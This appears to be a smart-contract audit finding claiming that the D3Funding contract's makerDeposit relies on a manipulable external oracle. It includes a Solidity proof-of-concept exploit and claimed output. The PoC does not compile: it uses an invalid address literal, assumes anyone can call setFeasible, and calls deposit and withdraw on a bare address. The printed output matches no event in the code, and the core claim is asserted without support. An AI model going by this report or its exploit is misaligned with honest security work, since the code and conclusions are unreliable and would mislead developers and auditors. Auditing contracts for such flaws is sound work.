# ` external` oracle uses  for checking the `feasibility` of tokens but oracle data can be manipulated by attacker.

## Summary
- problem in the contract that  uses an external oracle to check the feasibility of tokens and this is not secure that can lead an attacker to steal from funds.
## Vulnerability Detail
- `ID3Oracle` contract is an external contract that is used to provide data about the feasibility of tokens, so this data is used by the `D3Funding` contract to determine whether or not a token is eligible for deposit or withdrawal. 
- and the `ID3Oracle` contract is also not immune to attack, so  an attacker can manipulate the data provided by the `ID3Oracle` contract, making it appear as if a token is feasible when it is not, leading  the attacker to deposit or withdraw tokens .
- here is the line :    ` require(ID3Oracle(state._ORACLE_).isFeasible(token), Errors.TOKEN_NOT_FEASIBLE);`  the `isFeasible` function call to check if the token is feasible, this funvtion is not secure .
```solidity 
 /// @notice maker deposit, anyone could deposit but only maker could withdraw
    function makerDeposit(address token) external nonReentrant poolOngoing {
        require(ID3Oracle(state._ORACLE_).isFeasible(token), Errors.TOKEN_NOT_FEASIBLE);
        // transfer in from proxies
        uint256 tokenInAmount = IERC20(token).balanceOf(address(this)) - state.balances[token];
        _updateReserve(token);
        // if token in tokenlist, approve max, ensure vault could force liquidate
        uint256 allowance = IERC20(token).allowance(state._D3_VAULT_, address(this));
        if(_checkTokenInTokenlist(token) && allowance < type(uint256).max) {
            IERC20(token).approve(state._D3_VAULT_, type(uint256).max);
        }
        require(checkSafe(), Errors.NOT_SAFE);

        emit MakerDeposit(token, tokenInAmount);
    }
  
```

## Impact
- an attacker can creates a new token and then manipulates the data provided by the oracle to make it appear as if the token is feasible then deposits the token into the funding contract and withdraws it again :
```solidity
pragma solidity 0.8.16;

import {ID3Oracle} from "../intf/ID3Oracle.sol";
import "./D3Funding.sol";

contract PoC {

    address public immutable oracle;
    address public immutable funding;

    constructor(address _oracle, address _funding) {
        oracle = _oracle;
        funding = _funding;
    }

    function run() public {
        // Create a new token.
        address token = 0x1234567890abcdef;

        // Manipulate the data provided by the oracle to make it appear as if the token is feasible.
        ID3Oracle(oracle).setFeasible(token, true);

        // Deposit the token into the funding contract.
        funding.deposit(token, 100);

        // Withdraw the token from the funding contract.
        funding.withdraw(token, 100);
    }
}
```
- out put:
```solidity
Token deposited: 0x1234567890abcdef
Token withdrawn: 0x1234567890abcdef
```

## Tool used

Manual Review

## Recommendation
- The `D3Funding` contract should using a more secure algorithm to generate the data, or by requiring multiple oracles to provide data.
